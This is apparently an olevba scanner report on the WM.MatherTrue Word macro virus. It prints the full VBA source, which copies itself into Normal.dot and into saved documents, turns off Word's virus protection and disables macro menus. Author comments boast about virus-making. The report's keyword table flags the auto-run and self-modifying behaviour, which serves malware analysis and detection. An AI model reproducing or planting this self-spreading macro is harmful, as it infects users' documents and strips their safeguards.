olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mtrue.b-c99b5e82633d00899e0f2e74f6195ab928035a55
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mtrue.b-c99b5e82633d00899e0f2e74f6195ab928035a55 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MatherTrue.bas 
in file: Virus.MSWord.Mtrue.b-c99b5e82633d00899e0f2e74f6195ab928035a55 - OLE stream: 'Macros/VBA/MatherTrue'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

  Dim ResultFDoc As Boolean 'True если в активном документе есть модуль с именем Мname
  Dim ResultFTemplite As Boolean 'True если в Normal.Dot есть модуль с именем Мname
  Dim Path_Normal As String 'путь к Normal.Dot
  Dim Path_Doc As String 'путь к активному документу
  Dim I As Integer 'переменная для цикла
  Dim HowMach As Integer 'количество модулей в проекте
  Dim Doc As Boolean
  Dim N As Integer

  Public Const Mname As String = "MatherTrue" 'имя модуля, откуда брать код
  
'Вызываеться при нажатии на кнопку Organizer
Public Sub Organizer()
Attribute Organizer.VB_Description = "Макрос записан 31.03.99 33715351"
Attribute Organizer.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.DS"
           CommandBars("Visual Basic").Enabled = True
           With CommandBars("Macro")
             For I = 1 To .Controls.Count
                 .Controls(I).Enabled = False
             Next I
           End With
           ShowVisualBasicEditor = False
           Application.DisplayStatusBar = True
           With Options
                .VirusProtection = False
                .AllowFastSave = True
                .SaveInterval = 3
           End With
End Sub

'Вызываеться при нажатии на кнопку Macro
Public Sub ToolsMacro()
End Sub

'Вызываеться при создании нового документа (при запуске Word'а новый документ создаёться автоматически)
Public Sub AutoNew()
           Call Organizer
End Sub

'Вызываеться при активизации режима сохранения активного документа или шаблона (нажатии на кнопку "Сохранить")
Public Sub FileSave()
              Doc = False
              N = Len(ActiveDocument.Name)
           If N < 10 Then N = 1
           If N >= 10 And N <= 99 Then N = 2
           If N >= 99 And N <= 1000 Then N = 3
           If Mid(ActiveDocument.Name, 1, Len(ActiveDocument.Name) - N) = "Документ" Then Doc = True
           ShowVisualBasicEditor = True
           ResultFDoc = False
           If PrintPreview = False Then
              HowMach = Application.ActiveDocument.VBProject.VBComponents.Count
              For I = 1 To HowMach
                If Mname = Application.ActiveDocument.VBProject.VBComponents(I).Name Then ResultFDoc = True
              Next I
              If ResultFDoc <> True Then
                 Path_Normal = Application.NormalTemplate.FullName
                 Path_Doc = Application.ActiveDocument.FullName
                 Application.OrganizerCopy Source:=Path_Normal, Destination:=Path_Doc, Name:=Mname, Object:=wdOrganizerObjectProjectItems
                 Call Organizer
              End If
            If Doc = True Then Dialogs(wdDialogFileSaveAs).Show: Exit Sub
            ActiveDocument.Save
            End If
End Sub

'Вызываеться при активизации режима сохранения всех активных документов и/или шаблонов (нажатии на кнопку "Сохранить все")
Public Sub FileSaveAll()
           ShowVisualBasicEditor = False
           Call FileSave
End Sub

'Вызываеться при активизации режима печати с текущими установками
Public Sub FilePrintDefault()
           ShowVisualBasicEditor = False
         '  ActiveDocument.Content.InsertAfter Text:="Вот такая она правда-мамка, а против правды не попрёшь...Привет  Михайловой Юльке. Coded by DI°            WM.MatherTrue -  I see, i'm here, i'm conqure ..."
           ActiveDocument.PrintOut
End Sub

'Вызываеться при активизации диалогоого окна печати
Public Sub FilePrint()
           ShowVisualBasicEditor = False
        '   ActiveDocument.Content.InsertAfter Text:="Вот такая она правда-мамка, а против правды не попрёшь...Привет  Михайловой Юльке. Coded by DI°            WM.MatherTrue -  I see, i'm here, i'm conqure ... "
           Dialogs(wdDialogFilePrint).Show
End Sub

'Вызываеться при открытии документа/шаблона
'инсталяция кода в Normal.Dot
Public Sub AutoOpen()
           ResultFTemplite = False
           If PrintPreview = False Then
              HowMach = Application.NormalTemplate.VBProject.VBComponents.Count
              For I = 1 To HowMach
                If Mname = Application.NormalTemplate.VBProject.VBComponents(I).Name Then ResultFTemplite = True
              Next I
              If ResultFTemplite <> True Then
                 Path_Normal = Application.NormalTemplate.FullName
                 Path_Doc = Application.ActiveDocument.FullName
                 Application.OrganizerCopy Source:=Path_Doc, Destination:=Path_Normal, Name:=Mname, Object:=wdOrganizerObjectProjectItems
              End If
           End If
End Sub
' Destroyer Inc° Or PIPA's E&CS™ Company presented the
' MacroVirus WM.MatherTrue
' (C) CopyRight 16.04.1999 Ukrein Hmelnitsky
' WM.MatherTrue Was Make In Ms Offise (MS Word - 8.0)
' Hackers And VirusMakers All Country - UNITED !!!
' "Virus For PC, PC For Virus"
' Big Hy For VRV Virus Production™, Predator'S°,SNAKE,S@S,DM,AlexHelraiser  by Destroyer Inc °
' ДЕМБЕЛЬ не избежен !!!' АРИЯ бессмертна !!! АРИЯ The Best !!!
'
' #####      ######    #####    #######   ######     ####    #     #   ######   ######
' #    ##    #    #   #     #      #      #     #   #    #   #     #   #    #   #     #
' #     ##   # #      #            #      #     #   #    #   #     #   # #      #     #
' #      #   ###       #####       #      ######    #    #    #### #   ###      ######
' #     ##   # #            #      #      #  #      #    #         #   # #      #  #
' #    ##    #    #   #     #      #      #   #     #    #         #   #    #   #   #
' #####      ######    #####       #      #    #     ####     ####     ######   #    #
'
'
'         #######   #     #   #######   ##
'            #      ##    #   #     #   ##
'            #      # #   #   #
'            #      #  #  #   #
'            #      #   # #   #
'            #      #    ##   #
'         #######   #     #   #######
'
'

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Hex String|3qSQ                |33715351                                     |
+----------+--------------------+---------------------------------------------+
